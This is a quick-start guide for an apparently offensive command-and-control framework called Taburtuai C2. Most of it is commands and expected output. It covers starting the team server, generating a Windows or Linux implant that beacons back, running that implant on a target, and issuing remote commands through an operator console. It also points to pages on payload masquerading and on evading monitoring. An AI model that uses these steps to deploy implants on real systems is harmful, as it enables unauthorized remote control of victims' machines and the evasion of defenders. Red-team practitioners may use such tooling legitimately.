# Quick Start

Get a team server running, generate your first agent, and establish a session in under 10 minutes.

---

## Prerequisites

- Go 1.21+ installed on the server machine
- `git` to clone the repository
- A network path from the target machine to the server (or a redirector in front of it)

```bash
git clone https://github.com/mjopsec/taburtuaiC2
cd taburtuaiC2
go mod download
```

---

## Step 1 — Start the Team Server

The server only requires one mandatory variable: `ENCRYPTION_KEY`. This key is the AES-256-GCM key that encrypts all agent traffic. Every agent built for this server must use the same key.

```bash
ENCRYPTION_KEY=changeme go run ./cmd/server
```

**Expected output:**
```
[*] Taburtuai C2 v2.0.0 starting...
[*] Database: ./data/taburtuai.db
[*] HTTP listener on 0.0.0.0:8080
[*] Web dashboard: http://0.0.0.0:8080/
[+] Server ready.
```

**Custom port and auth:**
```bash
ENCRYPTION_KEY=changeme \
API_KEY=mysecrettoken \
go run ./cmd/server --port 9000 --auth
```

The web dashboard is available at `http://<server-ip>:<port>/`. All operator commands work through the CLI as well as through the API directly.

---

## Step 2 — Build the Operator CLI

```bash
go build -o bin/taburtuai ./cmd/operator
```

Connect to your server:
```bash
./bin/taburtuai --server http://127.0.0.1:8080 agents list
```

Or set the environment variable to avoid typing it every time:
```bash
export TABURTUAI_SERVER=http://127.0.0.1:8080
./bin/taburtuai agents list
```

---

## Step 3 — Generate an Agent

Build a Windows agent that connects back to your server:

```bash
go run ./cmd/generate stageless \
  --server http://YOUR_SERVER_IP:8080 \
  --key changeme \
  --os windows \
  --arch amd64 \
  --output ./output/agent.exe
```

**Expected output:**
```
[*] Building agent (windows/amd64)...
[+] Output: ./output/agent.exe
    Size  : 8.4 MB
    SHA256: a1b2c3d4...
    Build : 12.3s
```

For a quick Linux test on the same machine:
```bash
go run ./cmd/generate stageless \
  --server http://127.0.0.1:8080 \
  --key changeme \
  --os linux \
  --arch amd64 \
  --output ./output/agent
```

---

## Step 4 — Run the Agent

Execute the agent on your target (or locally for a test):
```bash
./output/agent        # Linux
.\output\agent.exe    # Windows
```

The agent beacons to the server using the configured interval (default: 30 seconds). Check in about 30 seconds:

```bash
./bin/taburtuai agents list
```

**Expected output:**
```
[+] Found 1 agent(s)

AGENT ID                             HOSTNAME             USERNAME        STATUS     LAST SEEN           
----------------------------------------------------------------------------------------------------
a1b2c3d4-e5f6-...                    DESKTOP-ABC          john\user       online     2026-04-25 14:23:01
```

---

## Step 5 — Open the Interactive Console

The console is the recommended way to run an engagement. You only specify the server once.

```bash
./bin/taburtuai console --server http://YOUR_SERVER_IP:8080
```

**Console prompt:**
```
[YOUR_SERVER_IP:8080] ❯ 
```

Try your first commands:
```
[host:8080] ❯ agents list
[host:8080] ❯ cmd a1b2c3d4 "whoami"
[host:8080] ❯ status <cmd-id>
```

Type `help` to see all available commands grouped by category.

---

## Summary

| Step | Command | Notes |
|------|---------|-------|
| Start server | `ENCRYPTION_KEY=key go run ./cmd/server` | Key must match agent |
| Build CLI | `go build -o bin/taburtuai ./cmd/operator` | One-time |
| Generate agent | `go run ./cmd/generate stageless ...` | Set --server and --key |
| Run agent | Execute on target | Beacons every 30s |
| Connect CLI | `./bin/taburtuai console` | Interactive console |

---

## Next Steps

- [Building Payloads](04-building-payloads.md) — OPSEC profiles, formats, masquerading
- [Operator Console](05-operator-console.md) — complete command reference
- [Evasion](12-evasion.md) — before running anything on a monitored target
